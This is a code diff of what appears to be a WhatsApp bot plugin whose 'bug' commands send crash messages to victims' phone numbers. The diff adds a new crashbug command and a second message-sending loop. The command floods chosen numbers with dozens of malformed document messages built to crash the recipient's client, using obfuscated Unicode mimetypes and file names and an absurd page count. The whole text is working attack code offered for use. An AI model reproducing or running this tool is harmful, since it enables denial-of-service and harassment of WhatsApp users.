@@ -45,7 +45,7 @@ const timewisher = (time) => {
   } 
 };
 
-async function sendbug(dest, zk, ms, repondre, amount, victims, bug){
+async function relaybug(dest, zk, ms, repondre, amount, victims, bug){
     for (let i = 0; i < victims.length; i++){
       if (!phoneRegex.test(victims[i])){
         repondre(`${victims[i]} not a valid phone number`);
@@ -56,6 +56,31 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug){
           var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject(bug), { userJid: dest, quoted : ms});
           try {
             zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+          } catch (e) {
+            repondre(`An error occured while sending bugs to ${victims[i]}`);
+            console.log(`An error occured while sending bugs to ${victim}: ${e}`);
+            break;
+          }
+          await delay(3000);
+        }
+        if (victims.length > 1)
+          repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
+        await delay(5000);
+      }
+    }
+    repondre(`Successfully sent ${amount} bugs to ${victims.join(', ')}.`);
+  }
+  
+async function sendbug(dest, zk, ms, repondre, amount, victims, bug){
+    for (let i = 0; i < victims.length; i++){
+      if (!phoneRegex.test(victims[i])){
+        repondre(`${victims[i]} not a valid phone number`);
+        continue;
+      } else {
+        const victim = victims[i] + '@s.whatsapp.net';
+        for (let j = 0; j < amount; j++){
+          try {
+            zk.sendMessage(victim, bug);
           } catch (e) {
             repondre(`An error occured while sending bugs to ${victims[i]}`);
             console.log(`An error occured while sending bugs to ${victim}: ${e}`);
@@ -93,9 +118,10 @@ zokou(
 ${timewisher(time)}
 
 ≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
-docbug
+bug
 loccrash
 amountbug <amount>
+crashbug <number>
 pmbug <number>
 delaybug <number>
 trollybug <number>
@@ -147,10 +173,10 @@ docugcbug <grouplink>${mono}`;
 );
 
 
-//crashbug 
+//bug 
 zokou(
     {
-      nomCom: 'crashbug',
+      nomCom: 'bug',
       categorie: category,
       reaction: reaction
     },
@@ -165,12 +191,14 @@ zokou(
       
       for (let i = 0; i < 25; i++) {
         const doc = {url: './set.js'};
-        await zk.sendMessage(dest, {
+        await zk.sendMessage(dest, 
+        {
           document: doc,
           mimetype: '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
           title: 'bx.pdf',
           pageCount: 9999999999,
           thumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
+          thumbnailUrl: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg',
           jpegThumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
           mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
           fileName:
@@ -181,6 +209,71 @@ zokou(
       await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
     }
 );
+
+//crashbug
+zokou(
+  {
+    nomCom: 'crashbug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${conf.NUMERO_OWNER} or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(',')[0]}`);
+    await loading(dest, zk);
+    const text = arg.join('');
+    let amount = 30;
+    let victims = [];
+    const bug = {
+          document: doc,
+          mimetype: '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
+          title: 'bx.pdf',
+          pageCount: 9999999999,
+          thumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
+          thumbnailUrl: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg',
+          jpegThumbnail: { url: 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg' },
+          mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
+          fileName:
+            '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n' +
+            bugpdf,
+         };
+    if (arg.length === 1){
+      victims.push(arg[0]);
+      await repondre(`sending ${amount} bugs to ${victims[0]}`);
+      try {
+        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        } catch (e){
+          await repondre('An error occured');
+          console.log(`An error occured: ${e}`);
+          await react(dest, zk, ms, '⚠️');
+      }
+    } else {
+      amount = parseInt(text.split('|')[0].trim());
+      if (isNaN(amount)){
+        return await repondre(`amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+      } else {
+        victims = text.split('|')[1].split(',').map(x => x.trim()).filter(x => x !== '');
+        if (victims.length > 0){
+          await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
+          try {
+            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+          } catch (e){
+            await repondre('An error occured');
+            console.log(`An error occured: ${e}`);
+            await react(dest, zk, ms, '⚠️');
+          }
+        } else {
+          return await repondre('No victims specfied');
+        }
+      }
+    }
+    await react(dest, zk, ms, '✅');
+  }
+  );
 
 //loccrash
 zokou(
@@ -280,7 +373,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -295,7 +388,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -339,7 +432,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -354,7 +447,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -398,7 +491,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -413,7 +506,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -457,7 +550,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -472,7 +565,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -516,7 +609,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -531,7 +624,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -575,7 +668,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -590,7 +683,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
@@ -640,7 +733,7 @@ zokou(
       victims.push(arg[0]);
       await repondre(`sending ${amount} bugs to ${victims[0]}`);
       try {
-        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
         } catch (e){
           await repondre('An error occured');
           console.log(`An error occured: ${e}`);
@@ -655,7 +748,7 @@ zokou(
         if (victims.length > 0){
           await repondre(`sending ${amount} bugs to ${victims.join(', ')}`);
           try {
-            await sendbug(dest, zk, ms, repondre, amount, victims, bug);
+            await relaybug(dest, zk, ms, repondre, amount, victims, bug);
           } catch (e){
             await repondre('An error occured');
             console.log(`An error occured: ${e}`);
